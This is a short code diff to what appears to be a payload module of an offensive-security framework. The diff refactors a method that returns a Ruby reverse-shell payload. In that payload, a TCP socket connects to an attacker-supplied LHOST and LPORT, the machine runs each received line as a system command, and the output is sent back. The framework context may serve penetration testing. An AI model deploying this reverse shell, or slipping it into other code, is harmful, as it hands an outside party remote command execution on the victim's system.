@@ -8,6 +8,9 @@ from lib.module.payload import PayloadClass
 from lib.module import safety
 from lib.module import intrusiveness
 
+import logging
+logger = logging.getLogger(__name__)
+
 class PayloadModule(PayloadClass):
     def __init__(self):
         super().__init__(**{
@@ -20,9 +23,9 @@ class PayloadModule(PayloadClass):
             }
         })
 
-    def payload_code(self):
+    def payload_code(self, options):
         return """require 'socket'
-s = TCPSocket.new '${LHOST}', ${LPORT}
+s = TCPSocket.new '""" + options["LHOST"] + """', """ + options["LPORT"] + """
 while line = s.gets
 value = %x( #{line} )
 s.puts value
